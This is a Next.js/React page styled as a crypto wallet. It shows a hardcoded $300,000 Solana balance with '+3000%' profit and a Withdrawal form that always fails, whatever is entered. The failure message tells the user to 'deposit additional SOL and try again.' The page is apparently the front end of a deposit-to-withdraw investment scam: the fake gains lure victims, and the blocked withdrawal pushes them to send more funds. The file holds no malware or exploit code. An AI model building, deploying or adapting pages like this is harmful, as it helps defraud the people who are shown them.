"use client";
import { useState } from "react";
export default function Page() {
  const [open, setOpen] = useState(false);
  const [wallet, setWallet] = useState("");
  const [amount, setAmount] = useState("");
  const [error, setError] = useState(false);

const handleWithdrawal = () => {
  setError(true);
};
  return (
    <main className="min-h-screen bg-black text-white flex justify-center overflow-x-hidden overflow-x-hidden">
      <div className="w-full max-w-md px-5 py-6 pb-24">
        {/* TOP MENU */}
        <div className="flex items-center gap-3 mb-8">
          <img
            src="/user.png"
            alt="User"
            className="w-12 h-12 rounded-full object-cover shrink-0"
          />
          <button className="bg-[#b89cff] text-black px-7 py-3 rounded-full text-xl font-bold">
            Home
          </button>
          <button className="bg-neutral-900 text-neutral-300 px-7 py-3 rounded-full text-xl font-bold">
            Trade
          </button>
          <button className="bg-neutral-900 text-neutral-300 px-7 py-3 rounded-full text-xl font-bold">
            Explore
          </button>
        </div>
        {/* ACCOUNT */}
        <p className="text-neutral-400 text-xl font-bold mb-2">
          Account 1⌄
        </p>
        <h1 className="text-7xl font-bold">$300,000</h1>
        <div className="flex gap-3 mt-4 text-2xl font-bold">
          <span className="text-green-400">+$300,000</span>
          <span className="bg-green-500 text-black px-3 rounded-xl">
            +3000%
          </span>
        </div>
        {/* CASH */}
        <div className="mt-8 bg-neutral-900 rounded-[28px] p-6 flex justify-between items-center">
          <div className="flex items-center gap-4">
            <img
              src="/cash.png"
              alt="Cash"
              className="w-10 h-10 object-contain"
            />
            <span className="text-2xl font-bold">Cash</span>
          </div>
          <span className="text-2xl">$0.00</span>
        </div>
        {/* TOKENS */}
        <h2 className="text-4xl font-bold mt-10 mb-5">
          Tokens ›
        </h2>
        <Token
  img="/solana.png"
  name="Solana"
  amount="4555.01 SOL"
  value="$300,000"
  profit="+$300,000"
/>
        <Token
          img="/bitcoin.png"
          name="Bitcoin"
          amount="0 BTC"
          value="$0.00"
          profit="$0.00"
        />
        <Token
          img="/ethereum.png"
          name="Ethereum"
          amount="0 ETH"
          value="$0.00"
          profit="$0.00"
        />
        {/* WITHDRAWAL BUTTON */}
        <button
          onClick={() => setOpen(true)}
          className="w-full mt-8 bg-[#b89cff] text-black rounded-[28px] py-5 text-2xl font-bold"
        >
          Withdrawal
        </button>
        {/* MODAL */}
        {open && (
          <div className="fixed inset-0 bg-black/80 flex items-end justify-center px-5 pb-6">
            <div className="w-full max-w-md bg-neutral-900 rounded-[30px] p-6">
              <h3 className="text-3xl font-bold mb-5">
                Withdrawal
              </h3>
              {error && (
  <div className="mb-5 rounded-3xl bg-black border border-[#b89cff]/40 p-4">
    <div className="flex items-start gap-3">
      <div className="w-10 h-10 rounded-full bg-[#b89cff] text-black flex items-center justify-center font-black text-xl">
        !
      </div>

      <div>
        <p className="text-[#b89cff] font-bold text-lg">
          Withdrawal Failed
        </p>

        <p className="text-neutral-400 text-sm mt-1">
          Not enough Solana available to process this withdrawal.
        </p>

        <p className="text-neutral-500 text-xs mt-2">
          Please deposit additional SOL and try again.
        </p>
      </div>
    </div>
  </div>
)}
              <label className="text-neutral-400">
                Wallet address
              </label>
              <input
                value={wallet}
                onChange={(e) => setWallet(e.target.value)}
                placeholder="Enter your wallet"
                className="w-full mt-2 mb-4 bg-black rounded-2xl px-4 py-4 outline-none"
              />
              <label className="text-neutral-400">
                Amount
              </label>
              <input
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="$0.00"
                className="w-full mt-2 mb-4 bg-black rounded-2xl px-4 py-4 outline-none"
              />
              <div className="mb-5 text-sm text-neutral-500">
                Network: Solana
              </div>
              <button
                onClick={handleWithdrawal}
                className="w-full bg-[#b89cff] text-black rounded-2xl py-4 font-bold text-xl"
              >
                Confirm Withdrawal
              </button>
              <button
                onClick={() => setOpen(false)}
                className="w-full mt-3 text-neutral-400 py-3"
              >
                Cancel
              </button>
            </div>
          </div>
        )}
      </div>
    </main>
  );
}
function Token({
  img,
  name,
  amount,
  value,
  profit,
}: {
  img: string;
  name: string;
  amount: string;
  value: string;
  profit: string;
}) {
  const isGreen = profit.startsWith("+");
  return (
    <div className="bg-neutral-900 rounded-[28px] p-5 flex justify-between items-center mb-3">
      <div className="flex items-center gap-4">
        <img
          src={img}
          alt={name}
          className="w-14 h-14 rounded-full object-contain"
        />
        <div>
          <p className="font-bold text-2xl">
            {name}
          </p>
          <p className="text-neutral-400 text-xl">
            {amount}
          </p>
        </div>
      </div>
      <div className="text-right">
        <p className="text-2xl font-semibold">
          {value}
        </p>
        <p
          className={`text-xl font-semibold ${
            isGreen
              ? "text-green-400"
              : "text-neutral-500"
          }`}
        >
          {profit}
        </p>
      </div>
    </div>
  );
}